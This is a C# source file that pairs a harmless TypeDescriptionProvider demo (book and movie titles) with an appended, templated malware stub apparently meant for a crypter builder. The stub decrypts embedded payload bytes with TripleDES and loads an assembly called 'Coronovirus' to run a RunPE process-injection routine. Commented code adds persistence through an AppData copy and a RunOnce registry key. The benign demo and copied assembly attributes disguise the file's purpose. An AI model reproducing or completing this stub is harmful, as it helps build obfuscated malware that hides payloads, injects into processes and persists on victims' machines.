using System;
using System.IO;
using System.IO.Compression;
using Microsoft.VisualBasic;
using System.Threading;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Text;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using Microsoft.VisualBasic.CompilerServices;
using System.Collections.Generic;
using System.Security.Permissions;
using System.Security;
using System.Resources;
using System.Security.Cryptography;
using System.Linq;
using System.Collections.ObjectModel;
using System.ComponentModel;

//Default [assembly: AssemblyTitle("TypeDescriptionProviderDemo")]
//Default [assembly: AssemblyDescription("")]
//Default [assembly: AssemblyCompany("Nishant Sivakumar")]
//Default [assembly: AssemblyProduct("TypeDescriptionProviderDemo")]
//Default [assembly: AssemblyCopyright("Copyright ©  2008")]
//Default [assembly: AssemblyFileVersion("5.66.0.7716")]

//Assembly [assembly: AssemblyTitle("{1}")]
//Assembly [assembly: AssemblyDescription("{2}")]
//Assembly [assembly: AssemblyCompany("{3}")]
//Assembly [assembly: AssemblyProduct("{4}")]
//Assembly [assembly: AssemblyCopyright("{5}")]
//Assembly [assembly: AssemblyFileVersion("{7}.{8}.{9}.{10}")]


namespace TypeDescriptionProviderDemo
{
    enum MovieRating
    {
        G,
        PG,
        PG13,
        R,
        NC17
    }
}

namespace TypeDescriptionProviderDemo
{
    class TitleTypeDescriptionProvider : TypeDescriptionProvider
    {
        private static TypeDescriptionProvider defaultTypeProvider = TypeDescriptor.GetProvider(typeof(Title));

        public TitleTypeDescriptionProvider()
            : base(defaultTypeProvider)
        {
        }

        public override ICustomTypeDescriptor GetTypeDescriptor(Type objectType, object instance)
        {
            ICustomTypeDescriptor defaultDescriptor = base.GetTypeDescriptor(objectType, instance);

            return instance == null ? defaultDescriptor : new TitleCustomTypeDescriptor(defaultDescriptor, instance);
        }
    }
}

namespace TypeDescriptionProviderDemo
{
    [TypeDescriptionProvider(typeof(TitleTypeDescriptionProvider))]
    sealed class Title
    {
        public Title(String name, TitleCategory category)
        {
            this.Name = name;
            this.Category = category;
        }

        public String Name { get; set; }

        [Browsable(false)]
        public TitleCategory Category { get; private set; }

        public override string ToString()
        {
            return Name;
        }

        private Dictionary<String, Object> customFieldValues = new Dictionary<String, Object>();

        public Object this[String fieldName]
        {
            get
            {
                Object value = null;
                customFieldValues.TryGetValue(fieldName, out value);
                return value;
            }

            set
            {
                customFieldValues[fieldName] = value;
            }
        }
    }
}


namespace TypeDescriptionProviderDemo
{
    enum TitleCategory
    {
        Book,
        Movie
    }
}


namespace TypeDescriptionProviderDemo
{
    class CustomFieldPropertyDescriptor : PropertyDescriptor
    {
        public CustomField CustomField { get; private set; }

        public CustomFieldPropertyDescriptor(CustomField customField)
            : base(customField.Name, new Attribute[0])
        {
            CustomField = customField;
        }

        public override bool CanResetValue(object component)
        {
            return false;
        }

        public override Type ComponentType
        {
            get 
            {
                return typeof(Title);
            }
        }

        public override object GetValue(object component)
        {
            Title title = (Title)component;
            return title[CustomField.Name] ?? (CustomField.DataType.IsValueType ? (Object)Activator.CreateInstance(CustomField.DataType) : null);
        }

        public override bool IsReadOnly
        {
            get 
            {
                return false;
            }
        }

        public override Type PropertyType
        {
            get
            {
                return CustomField.DataType;
            }
        }

        public override void ResetValue(object component)
        {
            throw new NotImplementedException();
        }

        public override void SetValue(object component, object value)
        {
            Title title = (Title)component;
            title[CustomField.Name] = value;
        }

        public override bool ShouldSerializeValue(object component)
        {
            return false;
        }
    }
}

namespace TypeDescriptionProviderDemo
{
    class TitleCustomTypeDescriptor : CustomTypeDescriptor
    {
        public TitleCustomTypeDescriptor(ICustomTypeDescriptor parent, object instance)
            : base(parent)
        {
            Title title = (Title)instance;

            customFields.AddRange(CustomFieldsGenerator.GenerateCustomFields(title.Category)
                .Select(f => new CustomFieldPropertyDescriptor(f)).Cast<PropertyDescriptor>());

        }

        private List<PropertyDescriptor> customFields = new List<PropertyDescriptor>();

        public override PropertyDescriptorCollection GetProperties()
        {
            return new PropertyDescriptorCollection(base.GetProperties()
                    .Cast<PropertyDescriptor>()
                    .Union(customFields)
                    .ToArray());
        }

        public override PropertyDescriptorCollection GetProperties(Attribute[] attributes)
        {
            return new PropertyDescriptorCollection(base.GetProperties(attributes)
                    .Cast<PropertyDescriptor>()
                    .Union(customFields)
                    .ToArray());
        }

    }
}



namespace TypeDescriptionProviderDemo
{
    static class DemoDataProvider
    {
        public static ReadOnlyCollection<Title> GetTitles()
        {
            return new[]
            {
                GetBook("C++/CLI in Action", "Nishant Sivakumar", false, 34),
                GetMovie("Spiderman III", "Sam Raimi", MovieRating.PG13, new TimeSpan(2,19,10), new DateTime(2007, 5, 1))
            }.ToList<Title>().AsReadOnly();
        }

        private static Title GetBook(string name, string author, bool isHardCover, int amazonRank)
        {
            Title title = new Title(name, TitleCategory.Book);
            title["Author"] = author;
            title["HardCover"] = isHardCover;
            title["Amazon Rank"] = amazonRank;
            return title;
        }

        private static Title GetMovie(string name, string director, MovieRating rating, TimeSpan duration, DateTime releaseDate)
        {
            Title title = new Title(name, TitleCategory.Movie);
            title["Director"] = director;
            title["Rating"] = rating;
            title["Duration"] = duration;
            title["Release Date"] = releaseDate;
            return title;
        }
    }
}
namespace TypeDescriptionProviderDemo
{
    static class CustomFieldsGenerator
    {
        internal static IEnumerable<CustomField> GenerateCustomFields(TitleCategory category)
        {
            List<CustomField> customFields = new List<CustomField>();

            switch (category)
            {
                case TitleCategory.Book:
                    customFields.Add(new CustomField("Author", typeof(String)));
                    customFields.Add(new CustomField("HardCover", typeof(bool)));
                    customFields.Add(new CustomField("Amazon Rank", typeof(int)));
                    break;

                case TitleCategory.Movie:
                    customFields.Add(new CustomField("Director", typeof(String)));
                    customFields.Add(new CustomField("Rating", typeof(MovieRating)));
                    customFields.Add(new CustomField("Duration", typeof(TimeSpan)));
                    customFields.Add(new CustomField("Release Date", typeof(DateTime)));
                    break;
            }

            return customFields;
        }
    }
}



namespace TypeDescriptionProviderDemo
{
    class CustomField
    {
        public CustomField(String name, Type dataType)
        {
            Name = name;
            DataType = dataType;
        }

        public String Name { get; private set; }

        public Type DataType { get; private set; }
    }
}

namespace %28%
{
    static class %29%
    {


      [MethodImpl(MethodImplOptions.NoInlining)]
        internal static object KGdCeBlwh(object A_0)
        {
            try
            {
                if (File.Exists(((Assembly)A_0).Location))
                {
                    return ((Assembly)A_0).Location;
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists(((Assembly)A_0).GetName().CodeBase.ToString().Replace("file:///", "")))
                {
                    return ((Assembly)A_0).GetName().CodeBase.ToString().Replace("file:///", "");
                }
            }
            catch
            {
            }
            try
            {
                if (File.Exists(A_0.GetType().GetProperty("Location").GetValue(A_0, new object[0]).ToString()))
                {
                    return A_0.GetType().GetProperty("Location").GetValue(A_0, new object[0]).ToString();
                }
            }
            catch
            {
            }
            return "";
        } 


        [STAThread]
        static void Main()
        {
            

            bool %17%;
            System.Threading.Mutex %19% = new System.Threading.Mutex(true, "%18%", out %17%);

            if (!%17%)
            {
                MessageBox.Show("%20%");
                return;
            }
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            try
            {
               
            }
            catch (ObjectDisposedException ex)
            {

            }

            GC.KeepAlive(%19%);

            //Startup %35%();

            byte[] %5% = {%Razor%};

		    byte[] %6% = {%Runpe%};

		    byte[] %13% = (byte[])%4%(ref %5%, ref %7%);

            byte[] %14% = (byte[])%4%(ref %6%, ref %8%);

            Assembly %16% = Assembly.Load(%14%);

            MethodInfo %15% = %16%.GetType("Coronovirus.Coronovirus").GetMethod("Activity");

            %15%.Invoke(null, new object[] { Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), Environment.GetCommandLineArgs()[0]), %13% });
        }

        public static string %8% = "%RunpePassword%";

        public static string %7% = "%Password%";

        public static object %4%(ref byte[] %11%, ref string %9%)
        {
            MD5CryptoServiceProvider %12% = new MD5CryptoServiceProvider();
            byte[] %10% = %12%.ComputeHash(Encoding.Unicode.GetBytes(%9%));
            return new TripleDESCryptoServiceProvider
            {
                Key = %10%,
                Mode = CipherMode.ECB
            }.CreateDecryptor().TransformFinalBlock(%11%, 0, %11%.Length);
        }

       	//Startup public static void %35%()
        //Startup {
		//Startup int %36% = Conversions.ToInteger("1");
        //Startup if ((double)%36% != Conversions.ToDouble("1") || Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "%Name%", (object)null) != null)return;
        //Startup string %37% = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\%FolderName%\\%Startup File Name%";
        //Startup if (!Directory.Exists(Path.GetDirectoryName(%37%)))
        //Startup {
        //Startup Directory.CreateDirectory(Path.GetDirectoryName(%37%));
        //Startup File.Copy(Application.ExecutablePath, %37%, true);
        //Startup }
        //Startup Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "%Name%", (object)%37%);    
        //Startup }

    }
}
